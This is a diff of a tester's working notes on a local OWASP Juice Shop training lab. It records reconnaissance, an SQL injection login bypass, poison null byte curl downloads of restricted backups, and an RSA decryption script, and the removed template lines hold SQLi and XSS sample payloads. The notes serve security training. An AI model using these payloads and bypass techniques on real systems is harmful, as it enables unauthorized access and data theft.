@@ -1,423 +1,376 @@
-# Report - Juice Shop Vulnerabilities and Tracking
-
-## Project
+# OWASP Juice Shop Working Notes
 
 Target: OWASP Juice Shop  
 URL: `http://localhost:3000`  
+Date: 2026-05-04  
 Tester: Max  
-Purpose: Find, test, exploit, and record Juice Shop vulnerabilities for training.
+Purpose: Track reconnaissance, solved challenges, commands, evidence, and next attack paths.
 
-## How To Use This File
+## Current Status
 
-Use this file as your working report. For every step, paste screenshots, copied terminal output, Burp requests, Burp responses, browser notes, and short explanations of what you found.
+The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, and the encrypted token sale announcement was decrypted.
 
-Recommended evidence format:
+Solved so far:
 
-```md
-### Evidence
+| Challenge | Category | How it was solved |
+| --- | --- | --- |
+| Error Handling | Security Misconfiguration | Triggered an unhandled application/API error during early probing. |
+| Login Admin | Injection | Logged in as administrator using SQL injection in the login form. |
+| Admin Section | Broken Access Control | Browsed to `/#/administration` after becoming admin. |
+| Score Board | Miscellaneous | Found and opened `/#/score-board`. |
+| Bully Chatbot | Miscellaneous | Obtained a coupon from the support chatbot. |
+| Five-Star Feedback | Broken Access Control | Used admin access to remove 5-star feedback. |
+| Poison Null Byte | Improper Input Validation | Downloaded restricted backup files from `/ftp` with `%2500.md`. |
+| Forgotten Developer Backup | Sensitive Data Exposure | Downloaded `package.json.bak` via the poison null byte bypass. |
+| Forgotten Sales Backup | Sensitive Data Exposure | Downloaded `coupons_2013.md.bak` via the poison null byte bypass. |
+| Blockchain Hype | Security through Obscurity | Decrypted `announcement_encrypted.md` and opened the hidden token sale route. |
 
-Screenshot:
-Paste image here.
+## Reconnaissance
 
-Request:
-Paste Burp/curl request here.
+Nmap identified one exposed service:
 
-Response:
-Paste response here.
-
-Notes:
-Write what happened and why it matters.
+```text
+3000/tcp open ppp?
 ```
 
-## Setup Checklist
+The service fingerprint showed HTTP headers and HTML proving this is Juice Shop:
 
-- [ ] Docker installed
-- [ ] Juice Shop image pulled
-- [ ] Juice Shop container running
-- [ ] Browser opened at `http://localhost:3000`
-- [ ] Burp Suite installed
-- [ ] Browser proxy configured for Burp
-- [ ] Burp certificate installed in test browser, if HTTPS testing is needed later
-- [ ] Screenshots folder created for evidence
-
-## Testing Steps
-
-### 1. Start Juice Shop
-
-Run:
-
-```bash
-docker pull bkimminich/juice-shop
-docker run -d -p 3000:3000 bkimminich/juice-shop
+```text
+HTTP/1.1 200 OK
+<title>OWASP Juice Shop</title>
+X-Recruiting: /#/jobs
 ```
 
-Open:
+The browser target is:
 
 ```text
 http://localhost:3000
 ```
 
-Evidence:
+## Directory Discovery
 
-- Screenshot of Juice Shop running:
-- Docker command/output:
-- Notes:
+Initial Gobuster against `http://TARGET:3000` failed because `TARGET` was a placeholder. Running against localhost worked, but Juice Shop returns the Angular single-page app for unknown frontend routes, producing false-positive `200` responses with length `75002`.
 
-### 2. Nmap
-
-Use Nmap to confirm what is exposed locally.
-
-Example:
+Working command:
 
 ```bash
-nmap -sV -p 3000 localhost
+gobuster dir \
+  -u http://localhost:3000 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  --exclude-length 75002
 ```
 
-Record:
+Interesting results:
 
-- Open ports:
-- Service/version details:
-- Interesting findings:
-- Screenshot or terminal output:
+```text
+/api                  (Status: 500)
+/apis                 (Status: 500)
+/assets               (Status: 301)
+/ftp                  (Status: 200)
+/media                (Status: 301)
+/profile              (Status: 500)
+/promotion            (Status: 200)
+/redirect             (Status: 500)
+/rest                 (Status: 500)
+/robots.txt           (Status: 200)
+/video                (Status: 200)
+/Video                (Status: 200)
+```
 
-### 3. Browser Walkthrough
+Useful manual endpoints:
 
-Use the site normally before attacking it.
+```text
+http://localhost:3000/#/score-board
+http://localhost:3000/#/administration
+http://localhost:3000/ftp/
+http://localhost:3000/robots.txt
+http://localhost:3000/api/Challenges
+http://localhost:3000/api/Users
+http://localhost:3000/rest/admin/application-configuration
+http://localhost:3000/rest/products/search?q=
+```
 
-Check:
+## Admin Login
 
-- Login page
-- Register page
-- Products
-- Search
-- Basket/cart
-- Checkout flow
-- Contact/support forms
-- Error messages
+Admin access was obtained through SQL injection in the login form.
 
-Record:
+Payload used:
 
-- Pages visited:
-- Inputs/forms found:
-- Visible errors:
-- Interesting URLs:
-- Screenshots:
+```text
+Email: ' or 1=1--
+Password: anything
+```
 
-### 4. Browser DevTools
+After login, the admin section was accessible:
 
-Open DevTools with `F12`.
+```text
+http://localhost:3000/#/administration
+```
 
-Check:
+This solved:
 
-- Network tab
-- Console tab
-- Application tab
-- Sources tab
+```text
+Login Admin
+Admin Section
+```
 
-Record:
+## Scoreboard Discovery
 
-- API endpoints seen:
-- Cookies:
-- localStorage/sessionStorage values:
-- JavaScript files with useful names:
-- Console errors:
-- Screenshots:
+The hidden scoreboard was opened at:
 
-### 5. Burp Suite - Proxy Intercept On
+```text
+http://localhost:3000/#/score-board
+```
 
-Start Burp Suite and enable proxy interception.
+The API challenge list can also be pulled directly:
 
-Browser proxy:
+```bash
+curl http://localhost:3000/api/Challenges
+```
+
+This solved:
+
+```text
+Score Board
+```
+
+## FTP Enumeration
+
+The `/ftp` route looked empty in the browser, but direct HTML parsing showed exposed files:
+
+```bash
+curl -s http://localhost:3000/ftp/ | grep -Eo 'href="[^"]+"'
+```
+
+Files found:
+
+```text
+href="."
+href="quarantine"
+href="acquisitions.md"
+href="announcement_encrypted.md"
+href="coupons_2013.md.bak"
+href="eastere.gg"
+href="encrypt.pyc"
+href="incident-support.kdbx"
+href="legal.md"
+href="package-lock.json.bak"
+href="package.json.bak"
+href="suspicious_errors.yml"
+```
+
+The quarantine folder also exposed shortcut files:
+
+```bash
+curl -s http://localhost:3000/ftp/quarantine/ | grep -Eo 'href="[^"]+"'
+```
+
+Output:
+
+```text
+href="./.."
+href="."
+href="."
+href="juicy_malware_linux_amd_64.url"
+href="juicy_malware_linux_arm_64.url"
+href="juicy_malware_macos_64.url"
+href="juicy_malware_windows_64.exe.url"
+```
+
+## Poison Null Byte Download Bypass
+
+Restricted backup files were downloaded by appending a double-encoded null byte plus an allowed extension.
+
+Commands:
+
+```bash
+curl -O "http://localhost:3000/ftp/package.json.bak%2500.md"
+curl -O "http://localhost:3000/ftp/package-lock.json.bak%2500.md"
+curl -O "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
+curl -O "http://localhost:3000/ftp/incident-support.kdbx%2500.md"
+curl -O "http://localhost:3000/ftp/encrypt.pyc%2500.md"
+```
+
+This solved:
+
+```text
+Poison Null Byte
+Forgotten Developer Backup
+Forgotten Sales Backup
+```
+
+Coupon file output contained codes such as:
+
+```text
+n<MibgC7sn
+mNYS#gC7sn
+o*IVigC7sn
+k#pDlgC7sn
+```
+
+## Token Sale Crypto
+
+The encrypted announcement was downloaded:
+
+```bash
+curl -s http://localhost:3000/ftp/announcement_encrypted.md -o announcement_encrypted.md
+```
+
+The paired bytecode file contained useful strings:
+
+```bash
+strings encrypt.pyc%2500.md | head -80
+```
+
+Important strings:
+
+```text
+announcement.md
+announcement_encrypted.md
+confidential_document
+encrypted_document
+pow
+ord
+encrypt.py
+```
+
+Initial attempts with `sqrt(ciphertext)` and plain `pow(ord(char), exponent)` failed because the ciphertext uses RSA-style modular exponentiation. The working decryptor precomputed the ciphertext for printable characters using known RSA public parameters:
+
+```bash
+python3 - <<'PY'
+from pathlib import Path
+
+N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
+e = 65537
+
+charset = [chr(i) for i in range(33, 127)] + [" ", "\n", "\t"]
+lookup = {str(pow(ord(c), e, N)): c for c in charset}
+
+out = []
+for line in Path("announcement_encrypted.md").read_text().splitlines():
+    out.append(lookup.get(line.strip(), "?"))
+
+print("".join(out))
+PY
+```
+
+Decrypted result exposed:
+
+```text
+Major Announcement:
+
+Token Sale - Initial Coin Offering
+...
+URL: /#/tokensale-ico-ea
+```
+
+Opening the route solved the token sale challenge:
+
+```text
+http://localhost:3000/#/tokensale-ico-ea
+```
+
+This solved:
+
+```text
+Blockchain Hype
+```
+
+## Application Visibility
+
+Useful commands and workflows for seeing how the app works:
+
+```bash
+curl http://localhost:3000/robots.txt
+curl http://localhost:3000/api/Challenges
+curl http://localhost:3000/api/Users
+curl http://localhost:3000/rest/admin/application-configuration
+```
+
+Browser DevTools:
+
+- Application tab: inspect Local Storage and JWT/session values.
+- Network tab: filter for `api`, `rest`, `graphql`, `socket`.
+- Sources tab: inspect bundled JavaScript for hidden routes and client-side secrets.
+
+Burp/ZAP proxy:
 
 ```text
 HTTP proxy: 127.0.0.1
 Port: 8080
 ```
 
-In Burp:
-
-- Proxy -> Intercept -> Intercept is on
-- Visit Juice Shop in the browser
-- Send interesting requests to Repeater
-
-Record:
-
-- Screenshot of Burp intercepting traffic:
-- Important requests:
-- Important responses:
-- Notes:
-
-### 6. Burp Suite - Site Map
-
-Browse the full application while Burp records traffic.
-
-In Burp:
-
-- Target -> Site map
-- Review discovered paths
-- Mark interesting endpoints
-
-Record:
-
-- Discovered endpoints:
-- API routes:
-- Hidden or unusual paths:
-- Screenshots:
-
-### 7. Authentication Testing
-
-Test login and registration behavior.
-
-Try:
-
-- Normal registration
-- Normal login
-- Wrong password
-- Unknown email
-- SQL injection style input
-- Password reset flow
-
-Record:
-
-- Test account used:
-- Payloads tested:
-- Result:
-- Burp request/response:
-- Screenshots:
-
-### 8. Input Validation Testing
-
-Test forms and parameters.
-
-Look at:
-
-- Search box
-- Login form
-- Register form
-- Contact form
-- Product reviews
-- Basket quantities
-
-Record:
-
-- Input tested:
-- Payload:
-- Result:
-- Vulnerability suspected:
-- Evidence:
-
-### 9. SQL Injection Testing
-
-Test login, search, and API parameters carefully.
-
-Example payloads to record if used:
-
-```text
-'
-' OR '1'='1
-admin@juice-sh.op'--
-```
-
-Record:
-
-- Target field/endpoint:
-- Payload:
-- Result:
-- Request:
-- Response:
-- Screenshot:
-- Explanation:
-
-### 10. Cross-Site Scripting Testing
-
-Test reflected or stored input locations.
-
-Example payloads to record if used:
-
-```html
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-```
-
-Record:
-
-- Target field:
-- Payload:
-- Did JavaScript execute:
-- Screenshot:
-- Request/response:
-- Explanation:
-
-### 11. Access Control Testing
-
-Check whether normal users can access admin or other users' data.
-
-Look for:
-
-- User IDs in URLs or JSON
-- Admin endpoints
-- Basket IDs
-- Order IDs
-- Profile data
-
-Record:
-
-- Endpoint:
-- User account used:
-- What was accessed:
-- Why it is unauthorized:
-- Evidence:
-
-### 12. Sensitive Data Exposure
-
-Look for secrets or leaked information.
-
-Check:
-
-- JavaScript source files
-- API responses
-- Error messages
-- Cookies/storage
-- Public files
-
-Record:
-
-- Location:
-- Data found:
-- Risk:
-- Evidence:
-
-### 13. Directory and Endpoint Discovery
-
-Use tools like Gobuster or ffuf if available.
-
-Example:
+Docker/container visibility, if running locally:
 
 ```bash
-gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt
+docker ps
+docker logs -f <container_id>
+docker exec -it <container_id> sh
 ```
 
-Record:
+## File Upload Lead
 
-- Tool used:
-- Wordlist:
-- Interesting paths:
-- Output:
-- Screenshots:
+There are upload-related challenges:
 
-### 14. Confirm Each Vulnerability
-
-Before writing a final finding, confirm it works more than once.
-
-For each confirmed issue, record:
-
-- Vulnerability name:
-- OWASP category:
-- Affected endpoint/page:
-- Steps to reproduce:
-- Impact:
-- Evidence:
-- Possible fix:
-
-### 15. Write Final Findings
-
-Use the template below for every vulnerability.
-
-## Vulnerability Findings
-
-### Finding 1 - Title
-
-Status: Draft / Confirmed  
-Severity: Low / Medium / High / Critical  
-OWASP Category:  
-Affected URL or endpoint:
-
-#### Summary
-
-Write a short explanation of the vulnerability.
-
-#### Steps To Reproduce
-
-1. 
-2. 
-3. 
-
-#### Evidence
-
-Screenshot:
-
-Request:
-
-```http
-
+```text
+Upload Size - Upload a file larger than 100 kB.
+Upload Type - Upload a file that has no .pdf or .zip extension.
+XXE Data Access - Retrieve /etc/passwd or C:\Windows\system.ini.
+XXE DoS - Give the server something expensive to parse.
+Memory Bomb - Drop explosive data into a vulnerable file-handling endpoint.
+SSTi - Abuse arbitrary command execution to infect the server with juicy malware.
 ```
 
+The upload feature may help with XML/YAML/file validation challenges, but a real reverse shell is not usually the main Juice Shop path. The safer next step is to identify the upload endpoint in DevTools/Burp, confirm accepted extensions and content types, then target the explicit upload challenges.
+
+Record the upload endpoint here once found:
+
+```text
+Endpoint:
+Method:
+Content-Type:
+Accepted extensions:
+Max size behavior:
 Response:
-
-```http
-
 ```
 
-Notes:
+## Next High-Value Targets
 
-#### Impact
+Good next challenges to target:
 
-Explain what an attacker could do.
-
-#### Recommendation
-
-Explain how this should be fixed.
-
-### Finding 2 - Title
-
-Status: Draft / Confirmed  
-Severity: Low / Medium / High / Critical  
-OWASP Category:  
-Affected URL or endpoint:
-
-#### Summary
-
-#### Steps To Reproduce
-
-1. 
-2. 
-3. 
-
-#### Evidence
-
-Screenshot:
-
-Request:
-
-```http
-
-```
-
-Response:
-
-```http
-
-```
-
-Notes:
-
-#### Impact
-
-#### Recommendation
+| Challenge | Why it is a good next target |
+| --- | --- |
+| Password Hash Leak | Already admin; API excessive data exposure likely makes this quick. |
+| Confidential Document | `/ftp/acquisitions.md` is exposed and should be tested directly. |
+| Database Schema | Login/search SQLi path already confirmed. |
+| User Credentials | Same SQLi path can likely exfiltrate users. |
+| View Basket | Broken access control, usually ID manipulation. |
+| Manipulate Basket | Builds on basket ID abuse. |
+| Upload Size | Directly related to the discovered upload feature. |
+| Upload Type | Directly related to upload validation bypass. |
+| XXE Data Access | Likely via upload/import functionality. |
+| Exposed Metrics | Easy observability endpoint discovery. |
+| Privacy Policy | Easy low-difficulty completion. |
+| Zero Stars | Input validation on feedback rating. |
+| DOM XSS | Tutorial challenge, useful for XSS path. |
 
 ## Evidence Log
 
-Use this section to track screenshots, pasted images, terminal output, and Burp evidence.
+| Evidence ID | Date | Finding | Type | Location / Command |
+| --- | --- | --- | --- | --- |
+| EVID-001 | 2026-05-04 | Service identification | Nmap | `nmap -sV -p 3000 localhost` |
+| EVID-002 | 2026-05-04 | Directory discovery | Gobuster | `gobuster dir -u http://localhost:3000 ... --exclude-length 75002` |
+| EVID-003 | 2026-05-04 | FTP listing | curl | `curl -s http://localhost:3000/ftp/ \| grep -Eo 'href="[^"]+"'` |
+| EVID-004 | 2026-05-04 | Quarantine listing | curl | `curl -s http://localhost:3000/ftp/quarantine/ \| grep -Eo 'href="[^"]+"'` |
+| EVID-005 | 2026-05-04 | Null byte bypass | curl | `curl -O "...bak%2500.md"` |
+| EVID-006 | 2026-05-04 | Crypto source hints | strings | `strings encrypt.pyc%2500.md \| head -80` |
+| EVID-007 | 2026-05-04 | Token sale route | Python decrypt | RSA character lookup decryptor |
+| EVID-008 | 2026-05-04 | Challenge inventory | API | `curl http://localhost:3000/api/Challenges` |
 
-| Evidence ID | Date | Step/Finding | Type | Description | File or Paste Location |
-| --- | --- | --- | --- | --- | --- |
-| EVID-001 |  |  | Screenshot |  |  |
-| EVID-002 |  |  | Burp request/response |  |  |
-| EVID-003 |  |  | Terminal output |  |  |
+## Rough Notes
 
-## Notes
-
-Use this section for rough notes while testing.
-
-- 
-
+- Unknown Angular routes return HTTP `200` with the app shell, so directory brute forcing needs response-length filtering.
+- `/ftp` is a real sensitive data source even when the browser UI looks empty.
+- `%2500.md` bypassed extension restrictions on backup files.
+- The token sale route came from decrypted announcement content, not from brute forcing routes.
+- Upload functionality should be inspected with Burp before assuming it can lead to command execution.
